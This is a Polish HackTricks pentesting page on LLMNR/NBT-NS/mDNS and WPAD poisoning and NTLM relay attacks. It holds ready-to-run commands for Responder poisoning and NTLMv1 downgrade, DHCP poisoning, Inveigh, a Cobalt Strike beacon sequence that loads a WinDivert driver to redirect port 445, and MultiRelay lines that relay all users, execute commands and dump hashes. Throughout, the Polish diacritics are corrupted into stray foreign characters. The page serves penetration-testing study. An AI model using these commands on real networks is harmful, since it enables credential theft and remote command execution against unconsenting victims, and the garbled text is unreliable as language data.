# Spoofing LLMNR, NBT-NS, mDNS/DNS i WPAD oraz ataki relayowe

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Protokoy sieciowe

### Protokoy lokalnego rozwizywania host贸w
- **LLMNR, NBT-NS i mDNS**:
- Microsoft i inne systemy operacyjne u偶ywaj LLMNR i NBT-NS do lokalnego rozwizywania nazw, gdy DNS zawiedzie. Podobnie systemy Apple i Linux u偶ywaj mDNS.
- Protokoy te s podatne na przechwytywanie i spoofing z powodu ich nieautoryzowanej, rozgosowej natury w UDP.
- [Responder](https://github.com/lgandx/Responder) mo偶e by u偶ywany do podszywania si pod usugi, wysyajc sfaszowane odpowiedzi do host贸w zapytujcych te protokoy.
- Dalsze informacje na temat podszywania si pod usugi za pomoc Respondera mo偶na znale藕 [tutaj](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protok贸 automatycznego odkrywania proxy w sieci (WPAD)
- WPAD pozwala przegldarkom na automatyczne odkrywanie ustawie proxy.
- Odkrywanie jest uatwione przez DHCP, DNS lub przejcie do LLMNR i NBT-NS, jeli DNS zawiedzie.
- Responder mo偶e automatyzowa ataki WPAD, kierujc klient贸w do zoliwych serwer贸w WPAD.

### Responder do zatruwania protoko贸w
- **Responder** to narzdzie u偶ywane do zatruwania zapyta LLMNR, NBT-NS i mDNS, selektywnie odpowiadajc na podstawie typ贸w zapyta, g贸wnie celujc w usugi SMB.
- Jest preinstalowane w Kali Linux, konfigurowalne w `/etc/responder/Responder.conf`.
- Responder wywietla przechwycone hashe na ekranie i zapisuje je w katalogu `/usr/share/responder/logs`.
- Obsuguje zar贸wno IPv4, jak i IPv6.
- Wersja Windows Respondera jest dostpna [tutaj](https://github.com/lgandx/Responder-Windows).

#### Uruchamianie Respondera
- Aby uruchomi Respondera z domylnymi ustawieniami: `responder -I <Interface>`
- Dla bardziej agresywnego skanowania (z potencjalnymi skutkami ubocznymi): `responder -I <Interface> -P -r -v`
- Techniki przechwytywania wyzwa/odpowiedzi NTLMv1 dla atwiejszego amania: `responder -I <Interface> --lm --disable-ess`
- Podszywanie si pod WPAD mo偶na aktywowa za pomoc: `responder -I <Interface> --wpad`
- 呕dania NetBIOS mog by rozwizywane do IP atakujcego, a proxy uwierzytelniajce mo偶na skonfigurowa: `responder.py -I <interface> -Pv`

### Zatruwanie DHCP za pomoc Respondera
- Spoofing odpowiedzi DHCP mo偶e na stae zatru informacje routingu ofiary, oferujc bardziej dyskretn alternatyw dla zatruwania ARP.
- Wymaga precyzyjnej wiedzy o konfiguracji sieci docelowej.
- Uruchamianie ataku: `./Responder.py -I eth0 -Pdv`
- Ta metoda mo偶e skutecznie przechwytywa hashe NTLMv1/2, ale wymaga ostro偶nego podejcia, aby unikn zak贸ce w sieci.

### Przechwytywanie powiadcze za pomoc Respondera
- Responder bdzie podszywa si pod usugi korzystajce z wy偶ej wymienionych protoko贸w, przechwytujc powiadczenia (zwykle NTLMv2 Challenge/Response), gdy u偶ytkownik pr贸buje uwierzytelni si w podszywajcych si usugach.
- Mo偶na pr贸bowa obni偶y wersj do NetNTLMv1 lub wyczy ESS dla atwiejszego amania powiadcze.

Wa偶ne jest, aby zauwa偶y, 偶e stosowanie tych technik powinno odbywa si legalnie i etycznie, zapewniajc odpowiednie upowa偶nienie i unikajc zak贸ce lub nieautoryzowanego dostpu.

## Inveigh

Inveigh to narzdzie dla tester贸w penetracyjnych i zespo贸w red, zaprojektowane dla system贸w Windows. Oferuje funkcjonalnoci podobne do Respondera, wykonujc ataki spoofingowe i man-in-the-middle. Narzdzie ewoluowao z skryptu PowerShell do binarnego pliku C#, z [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) jako g贸wnymi wersjami. Szczeg贸owe parametry i instrukcje mo偶na znale藕 w [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh mo偶na obsugiwa za pomoc PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Lub wykonany jako binarny plik C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Atak ten wykorzystuje sesje uwierzytelniania SMB do uzyskania dostpu do docelowej maszyny, przyznajc powok systemow, jeli si powiedzie. Kluczowe wymagania wstpne obejmuj:
- U偶ytkownik uwierzytelniajcy musi mie dostp lokalnego administratora na przekazywanym hocie.
- Podpisywanie SMB powinno by wyczone.

#### Przekierowanie i tunelowanie portu 445

W scenariuszach, w kt贸rych bezporednie wprowadzenie do sieci nie jest mo偶liwe, ruch na porcie 445 musi by przekierowany i tunelowany. Narzdzia takie jak [**PortBender**](https://github.com/praetorian-inc/PortBender) pomagaj w przekierowywaniu ruchu portu 445 na inny port, co jest niezbdne, gdy dostp lokalnego administratora jest dostpny do adowania sterownik贸w.

Konfiguracja i dziaanie PortBender w Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Inne narzdzia do ataku NTLM Relay

- **Metasploit**: Skonfigurowany z proxy, szczeg贸ami lokalnych i zdalnych host贸w.
- **smbrelayx**: Skrypt w Pythonie do relaying sesji SMB i wykonywania polece lub wdra偶ania backdoor贸w.
- **MultiRelay**: Narzdzie z pakietu Responder do relaying konkretnych u偶ytkownik贸w lub wszystkich u偶ytkownik贸w, wykonywania polece lub zrzucania hashy.

Ka偶de narzdzie mo偶na skonfigurowa do dziaania przez proxy SOCKS, jeli to konieczne, co umo偶liwia ataki nawet przy porednim dostpie do sieci.

### Dziaanie MultiRelay

MultiRelay jest uruchamiane z katalogu _**/usr/share/responder/tools**_, celujc w konkretne adresy IP lub u偶ytkownik贸w.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Te narzdzia i techniki tworz kompleksowy zestaw do przeprowadzania atak贸w NTLM Relay w r贸偶nych rodowiskach sieciowych.

### Wymuszanie logowania NTLM

W systemie Windows **mo偶esz by w stanie wymusi, aby niekt贸re uprzywilejowane konta uwierzytelniay si na dowolnych maszynach**. Przeczytaj nastpujc stron, aby dowiedzie si jak:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Odniesienia
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
